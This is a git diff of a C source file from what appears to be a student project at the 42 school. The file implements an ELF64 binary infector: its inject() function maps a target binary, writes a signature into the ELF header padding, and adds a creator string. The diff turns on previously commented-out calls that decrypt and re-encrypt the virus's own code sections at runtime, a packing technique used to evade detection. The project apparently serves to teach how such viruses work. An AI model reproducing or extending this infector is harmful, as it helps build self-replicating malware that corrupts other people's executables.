@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/11 12:41:38 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 17:16:52 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -24,8 +24,7 @@ void		inject(t_data *data)
 	_log(de, _strlen(de));
 #endif
 
-	/* revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect); */
-
+	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
 
 	if (data->context == false || data->context != true)
 		goto next;
@@ -52,6 +51,7 @@ void		inject(t_data *data)
 	// step 2 : insert signature
 	data->header = (Elf64_Ehdr*)map;
 	*(uint32_t*)&data->header->e_ident[EI_PAD] = SIGNATURE;
+
 
 	// step 3 : MORE SIGNATURE
 	char created[] = CREATED_BY;
@@ -108,7 +108,8 @@ void		inject(t_data *data)
 	data->context = true;
 
 next:
-	/* update_two(&data->key, (char*)inject, (size_t)patch - (size_t)inject); */
-	/* revert_two(&data->key, (char*)patch, (size_t)release - (size_t)patch); */
+
+	update_two(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
+	revert_two(&data->key, (char*)patch, (size_t)release - (size_t)patch);
 	patch(data, map, size);
 }
